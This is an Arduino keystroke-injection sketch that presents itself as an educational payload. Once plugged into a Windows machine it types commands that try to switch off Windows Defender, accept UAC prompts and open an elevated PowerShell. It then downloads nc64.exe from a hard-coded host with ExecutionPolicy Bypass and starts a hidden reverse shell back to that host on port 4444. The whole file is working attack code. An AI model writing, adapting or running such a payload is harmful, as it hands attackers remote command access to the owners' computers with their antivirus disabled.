/*
 * HID Payload - Disable Windows Defender and Execute Reverse Shell
 * Author: [Your Name or Handle]

          
 * For: Educational and Ethical Testing Use Only
 * Device: Arduino Leonardo / Digispark / HID-compatible MCU
 */

#include "Keyboard.h"

// Utility function to type a key with a small delay
void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  Keyboard.begin();
  delay(500); // Initial delay after device is plugged in

  // Step 1: Open Run dialog (Win + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(200);

  // Step 2: Open Windows Defender Threat page
  Keyboard.print("windowsdefender://threat/");
  typeKey(KEY_RETURN);
  delay(500);

  // Step 3: Navigate Defender settings and attempt to disable protection
  for (int i = 0; i < 4; i++) {
    typeKey(KEY_TAB);
    delay(500);
  }
  typeKey(KEY_RETURN);
  delay(500);
  typeKey(' '); // Toggle off
  delay(500);

  // Step 4: Handle UAC prompt (ALT + Y)
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(1000);

  // Step 5: Navigate more settings
  typeKey(KEY_TAB);
  delay(500);
  typeKey(' ');
  delay(500);
  typeKey(KEY_TAB);
  delay(500);
  typeKey(' ');
  delay(1000);

  // Step 6: Open PowerShell as Administrator via Run dialog
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(200);

  Keyboard.print("powershell Start-Process powershell -Verb runAs");
  typeKey(KEY_RETURN);
  delay(4000);

  // Step 7: Handle UAC again
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(500);

  // Step 8: Download reverse shell and execute via PowerShell
  Keyboard.print("cd \\; md new; cd new; echo (powershell Invoke-WebRequest -OutFile shell.exe 'http://172.16.163.77/nc64.exe') > psh.ps1; powershell -ExecutionPolicy Bypass -file psh.ps1");
  typeKey(KEY_RETURN);
  delay(5000);

  // Step 9: Execute downloaded payload
  Keyboard.print("cmd.exe");
  typeKey(KEY_RETURN);
  delay(2000);

  Keyboard.print("START /MIN shell.exe 172.16.163.77 4444 -e cmd.exe -d & exit");
  typeKey(KEY_RETURN);
  delay(100);

  // Step 10: Exit cleanup
  Keyboard.print("EXIT");
  typeKey(KEY_RETURN);

  Keyboard.end();
}

void loop() {
  // Nothing here; runs once
}
